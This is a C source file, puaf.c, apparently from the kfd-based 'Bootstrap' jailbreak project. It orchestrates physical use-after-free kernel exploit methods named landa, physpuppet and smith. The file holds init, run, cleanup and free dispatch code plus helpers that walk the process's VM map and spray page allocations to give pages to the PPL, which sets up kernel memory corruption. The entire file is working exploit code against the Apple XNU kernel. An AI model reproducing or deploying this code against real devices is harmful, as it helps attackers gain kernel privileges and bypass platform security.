//
//  puaf.c
//  Bootstrap
//
//  Created by Chris Coding on 1/5/24.
//

#include <stdio.h>
#include "puaf.h"

void puaf_init(struct kfd* kfd, uint64_t puaf_pages, uint64_t puaf_method)
{
    kfd->puaf.number_of_puaf_pages = puaf_pages;
    kfd->puaf.puaf_pages_uaddr = (uint64_t*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(uint64_t)));

    switch (puaf_method) {
        puaf_method_case(landa)
        puaf_method_case(physpuppet)
        puaf_method_case(smith)
    }

    kfd->puaf.puaf_method_ops.init(kfd);
}

void puaf_run(struct kfd* kfd)
{
    puaf_helper_give_ppl_pages();

    timer_start();
    kfd->puaf.puaf_method_ops.run(kfd);
    timer_end();
}

void puaf_cleanup(struct kfd* kfd)
{
    timer_start();
    kfd->puaf.puaf_method_ops.cleanup(kfd);
    timer_end();
}

void puaf_free(struct kfd* kfd)
{
    kfd->puaf.puaf_method_ops.free(kfd);

    bzero_free(kfd->puaf.puaf_pages_uaddr, kfd->puaf.number_of_puaf_pages * sizeof(uint64_t));

    if (kfd->puaf.puaf_method_data) {
        bzero_free(kfd->puaf.puaf_method_data, kfd->puaf.puaf_method_data_size);
    }
}

void puaf_helper_get_vm_map_first_and_last(uint64_t* first_out, uint64_t* last_out)
{
    uint64_t first_address = 0;
    uint64_t last_address = 0;

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if (kret == KERN_INVALID_ADDRESS) {
            last_address = address;
            break;
        }

        assert(kret == KERN_SUCCESS);

        if (!first_address) {
            first_address = address;
        }

        address += size;
        size = 0;
    }

    *first_out = first_address;
    *last_out = last_address;
}

void puaf_helper_get_vm_map_min_and_max(uint64_t* min_out, uint64_t* max_out)
{
    task_vm_info_data_t data = {};
    task_info_t info = (task_info_t)(&data);
    mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
    assert_mach(task_info(mach_task_self(), TASK_VM_INFO, info, &count));

    *min_out = data.min_address;
    *max_out = data.max_address;
}

void puaf_helper_give_ppl_pages(void)
{
    timer_start();

    const uint64_t given_ppl_pages_max = 10000;
    const uint64_t l2_block_size = (1ull << 25);

    vm_address_t addresses[given_ppl_pages_max] = {};
    vm_address_t address = 0;
    uint64_t given_ppl_pages = 0;

    uint64_t min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    while (true) {
        address += l2_block_size;
        if (address < min_address) {
            continue;
        }

        if (address >= max_address) {
            break;
        }

        kern_return_t kret = vm_allocate(mach_task_self(), &address, pages(1), VM_FLAGS_FIXED);
        if (kret == KERN_SUCCESS) {
            memset((void*)(address), 'A', 1);
            addresses[given_ppl_pages] = address;
            if (++given_ppl_pages == given_ppl_pages_max) {
                break;
            }
        }
    }

    for (uint64_t i = 0; i < given_ppl_pages; i++) {
        assert_mach(vm_deallocate(mach_task_self(), addresses[i], pages(1)));
    }

    print_u64(given_ppl_pages);
    timer_end();
}



